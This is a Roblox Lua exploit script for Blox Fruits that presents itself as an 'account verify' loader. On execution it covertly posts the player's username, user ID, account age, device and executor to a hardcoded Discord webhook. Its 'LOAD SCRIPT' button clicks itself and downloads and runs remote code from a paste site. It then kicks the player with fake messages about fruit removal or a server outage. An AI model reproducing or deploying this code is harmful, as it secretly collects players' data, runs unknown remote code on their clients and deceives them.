if not game:IsLoaded() then game.Loaded:Wait() end

-- SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")
local player = Players.LocalPlayer

-- CONFIG
local webhookUrl = "https://discord.com/api/webhooks/1392698661900652554/9BvF-mOk5r-_vgc0clGyA8D3ec6HxOrN8zadROiP7QtS9qd5Gzj5rzJUuK4cT0z0AvAp"
local executor = identifyexecutor and identifyexecutor() or "Unknown"

-- Device detection
local device = "PC"
if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
	device = "Mobile"
elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
	device = "Console"
end

-- Game/Sea detection
local PlaceId = game.PlaceId
local GameName = "Unknown Game"
local sea = "N/A"
local isBloxFruits = false

if PlaceId == 2753915549 then
	GameName = "Blox Fruits"
	sea = "First Sea"
	isBloxFruits = true
elseif PlaceId == 4442272183 then
	GameName = "Blox Fruits"
	sea = "Second Sea"
	isBloxFruits = true
elseif PlaceId == 7449423635 then
	GameName = "Blox Fruits"
	sea = "Third Sea"
	isBloxFruits = true
elseif PlaceId == 1954280567 then
	GameName = "Blox Fruits"
	sea = "Fourth Sea"
	isBloxFruits = true
else
	local success, info = pcall(function()
		return MarketplaceService:GetProductInfo(PlaceId)
	end)
	if success and info and info.Name then
		GameName = info.Name
	end
end

-- Admin list (replace with real UserIds)
local bloxFruitsAdminIds = {
	12345678,
	87654321,
}

local isAdmin = false
for _, id in ipairs(bloxFruitsAdminIds) do
	if player.UserId == id then
		isAdmin = true
		break
	end
end

-- Webhook (only once)
_G.DRIX_LOGGED_ONCE = _G.DRIX_LOGGED_ONCE or false

if not _G.DRIX_LOGGED_ONCE then
	_G.DRIX_LOGGED_ONCE = true

	local embed = {
		["content"] = isAdmin and "RTaO | Dev ⚠️ **DRIX Script Executed!**" or "⚠️ **DRIX Script Executed!**",
		["embeds"] = {{
			["title"] = "📊 Player Execution Log",
			["color"] = 65280,
			["fields"] = {
				{["name"] = "👤 Username", ["value"] = player.Name, ["inline"] = true},
				{["name"] = "🆔 User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
				{["name"] = "📅 Account Age", ["value"] = tostring(player.AccountAge) .. " days", ["inline"] = true},
				{["name"] = "💻 Device", ["value"] = device, ["inline"] = true},
				{["name"] = "🧪 Exploit", ["value"] = executor, ["inline"] = true},
				{["name"] = "🌍 Game", ["value"] = GameName, ["inline"] = true},
			},
			["footer"] = {["text"] = "🛰️ RTaO LOGGER SYSTEM"}
		}}
	}

	if isBloxFruits then
		table.insert(embed.embeds[1].fields, {["name"] = "🌊 Sea Level", ["value"] = sea, ["inline"] = true})
	end

	local req = (syn and syn.request) or (http and http.request) or http_request or request
	pcall(function()
		req({
			Url = webhookUrl,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json"
			},
			Body = HttpService:JSONEncode(embed)
		})
	end)
end

-- Chat kick protection
for _, p in ipairs(Players:GetPlayers()) do
	if p ~= player then
		p.Chatted:Connect(function(msg)
			if msg:lower() == "kp" then
				player:Kick("WE HAVE CAUGHT YOU USING EXPLOIT. SO WE ARE REMOVING YOUR MYTHICAL FRUIT. DON'T USE EXPLOITS AGAIN!")
			end
		end)
	end
end
Players.PlayerAdded:Connect(function(p)
	if p ~= player then
		p.Chatted:Connect(function(msg)
			if msg:lower() == "kp" then
				player:Kick("WE HAVE CAUGHT YOU USING EXPLOIT. WE DON'T BAN, WE REMOVE YOUR MYTHICAL FRUIT.")
			end
		end)
	end
end)

-- GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "DrixVerifyGui"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 240, 0, 150)
frame.Position = UDim2.new(0.5, -120, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local uiStroke = Instance.new("UIStroke")
uiStroke.Color = Color3.fromRGB(0, 170, 255)
uiStroke.Thickness = 2.5
uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
uiStroke.Parent = frame

RunService.RenderStepped:Connect(function()
	local t = tick() * 2
	local glow = 0.6 + math.sin(t) * 0.4
	uiStroke.Transparency = 1 - glow
end)

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "ACCOUNT VERIFY"
title.TextColor3 = Color3.fromRGB(0, 170, 255)
title.TextScaled = true
title.Font = Enum.Font.SourceSansBold
title.Parent = frame

local loadButton = Instance.new("TextButton")
loadButton.Size = UDim2.new(0.8, 0, 0, 36)
loadButton.Position = UDim2.new(0.1, 0, 0.55, 0)
loadButton.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
loadButton.Text = "LOAD SCRIPT"
loadButton.TextScaled = true
loadButton.Font = Enum.Font.SourceSansBold
loadButton.TextColor3 = Color3.fromRGB(255, 255, 255)
loadButton.Parent = frame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = loadButton

local hue = 0
RunService.RenderStepped:Connect(function()
	hue = (hue + 0.01) % 1
	loadButton.TextColor3 = Color3.fromHSV(hue, 1, 1)
end)

local function loadScript()
	loadButton.Active = false
	loadButton.Text = "LOADED"

	local warningGui = Instance.new("ScreenGui")
	warningGui.Name = "ScriptLoadWarning"
	warningGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
	warningGui.ResetOnSpawn = false
	warningGui.Parent = player:WaitForChild("PlayerGui")

	local warningFrame = Instance.new("Frame")
	warningFrame.Size = UDim2.new(0.7, 0, 0.15, 0)
	warningFrame.Position = UDim2.new(0.5, -250, 0.65, 0)
	warningFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	warningFrame.BorderSizePixel = 0
	warningFrame.ZIndex = 10
	warningFrame.Parent = warningGui

	local frameCorner = Instance.new("UICorner")
	frameCorner.CornerRadius = UDim.new(0, 10)
	frameCorner.Parent = warningFrame

	local warningLabel = Instance.new("TextLabel")
	warningLabel.Size = UDim2.new(1, -20, 1, -20)
	warningLabel.Position = UDim2.new(0, 10, 0, 10)
	warningLabel.BackgroundTransparency = 1
	warningLabel.Text = "⚠️ PLEASE WAIT 5–8 MINUTES FOR THE SCRIPT TO MODIFY ⚠️"
	warningLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
	warningLabel.TextScaled = true
	warningLabel.Font = Enum.Font.SourceSansBold
	warningLabel.ZIndex = 11
	warningLabel.Parent = warningFrame

	task.spawn(function()
		while warningLabel and warningLabel.Parent do
			warningLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
			task.wait(0.5)
			warningLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
			task.wait(0.5)
		end
	end)

	task.delay(60, function()
		if warningGui then warningGui:Destroy() end
	end)

	task.delay(15 * 60, function()
		player:Kick("PLS TRY THIS SCRIPT AFTER 3–4 HOURS. SERVER DOWN.")
	end)

	task.delay(2, function()
		local success, err = pcall(function()
			loadstring(game:HttpGet("https://pastefy.app/SHjsiqS4/raw"))()
		end)
		if not success and warningLabel then
			warningLabel.Text = "Failed to load script."
			warningLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
		end
	end)
end

loadButton.MouseButton1Click:Connect(loadScript)

task.delay(3, function()
	if loadButton and loadButton.Parent and loadButton.Active then
		loadButton:Activate()
	end
end)
